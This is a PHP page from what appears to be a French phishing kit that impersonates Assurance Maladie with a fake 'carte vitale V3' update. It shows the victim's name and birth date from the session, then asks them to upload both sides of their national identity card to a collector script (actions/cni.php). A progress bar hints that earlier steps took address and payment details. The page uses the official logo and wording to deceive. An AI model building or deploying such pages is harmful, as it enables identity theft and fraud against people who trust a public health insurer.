<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        .progressbar > div{
            width: 25%;
        }

    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="/public/fav.png" type="image/ico">
    <style>

        .container{
            width : 95% !important;
        }

    </style>
    <title>Veuillez remplir le formulaire</title>
</head>

<body>

    <div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: rgb(76, 175, 80) none repeat scroll 0% 0%;">
        <div class="banner">
        <?php include ("../assets/svg.php") ?>
        </div>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Mise à jour carte vitale V3</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">
        <form  id="loginForm" action="../actions/cni.php" method="POST"  enctype="multipart/form-data">
        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url(../assets/images/back.png);">
                    <div class="panel-heading">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Informations postales</h2>
                    </div>

                    <div class="panel-body">
                        <br> Bénéficiaire : <b><?php echo $_SESSION["nom"] . " " . $_SESSION["prenom"]  ?></b>
                        <br> Date de naissance : <b><?php echo $_SESSION["naissance"] ?></b>
                        <br> Date de la demande : <b><?php echo $_SESSION["date"] ?> à  <?php echo $_SESSION["heure"] ?></b>
                        <hr>

                        <div class="row">
                            <div class="col-md-7">
                                <div class="col-md-12">

                                    <div class="progressbar">
                                        <div><span>Adresse</span>
                                            <div></div>
                                        </div>
                                        <div><span>Port</span>
                                            <div></div>
                                        </div>
                                        <div><span>Règlement</span>
                                            <div></div>
                                        </div>
                                        <div class="progressing"><span>Vérification</span>
                                            <div></div>
                                        </div>
                                    </div>
                                    <br><br>
                                </div>
                                <div class="col-md-12">

                                <style>
                                input[type="file"] {
                                    display: none;
                                }
                                .custom-file-upload {
                                    border: 1px solid #ccc;
                                    display: inline-block;
                                    padding: 6px 12px;
                                    cursor: pointer;
                                    background-color : #4caf50;
                                    color : white;
                                    padding : 10px 20px;
                                    border-radius: 0px;
                                    border : none;
                                }

                                </style>
                                <p>Afin de continuer, veuillez fournir ci-dessous un format numérisé de votre carte d'identité. <br> Celle-ci sera utilisée afin de vérifier que vous êtes bien la personne que vous prétendez être. </p>
                                <br> <br>
                            <p style="text-align : center;margin-bottom : 5px">Recto</p>
                            <div class="flex" style="display : flex;justify-content : center;align-items : center">
                                <label for="file-upload" class="custom-file-upload custom-file-upload1">
                                    <i class="fa fa-cloud-upload"></i> Choisir une image
                                </label>
                                <input id="file-upload" name="recto" class="file-upload-field f2" type="file" accept='.png,.PNG,.jpg,.JPG,.jpeg,.JPEG,.gif,.xls,.webp,.WEBP'/>
                            </div>
                                <br> 

                            <p style="text-align : center;margin-bottom : 5px">Verso</p>
                            <div class="flex" style="display : flex;justify-content : center;align-items : center">
                                <label for="file-upload2" class="custom-file-upload custom-file-upload2">
                                    <i class="fa fa-cloud-upload"></i> Choisir une image
                                </label>
                                <input id="file-upload2" name="verso" class="file-upload-field f3" type="file" accept='.png,.PNG,.jpg,.JPG,.jpeg,.JPEG,.gif,.xls,.webp,.WEBP'/>
                            </div>

                                    <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                            </div>
                            <div class="col-md-5" style="border-radius:6px;">
                                <img class="col-md-12" src="https://demarchesadministratives.fr/images/demarches/757/mise-a-jour-de-la-carte-vitale-pourquoi-et-comment.jpg" style="border-radius:60px;;">
                            </div>

                        </div>

                    </div>
                </div>
            </div>
        </div>
        <br><br>
        </form>
    </main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/ASSURANCE_MALADIE.svg/600px-ASSURANCE_MALADIE.svg.png">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>

	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

    <script>

                $("form").on("submit",function(){
                    $("#loading").css("display", "block");
                })
    </script>

    <script>
        $("#loginForm").on("change", function(){ 
                
                if($(".f2").val().length >= 1){
                    console.log("Oui")
                    $(".custom-file-upload1").text($(".f2").val().replace(/.*(\/|\\)/, ''));
                }

                if($(".f3").val().length >= 1){
                    console.log("Oui")

                    $(".custom-file-upload2").text($(".f3").val().replace(/.*(\/|\\)/, ''));
                }


            });

        
    </script>


</body>

</html>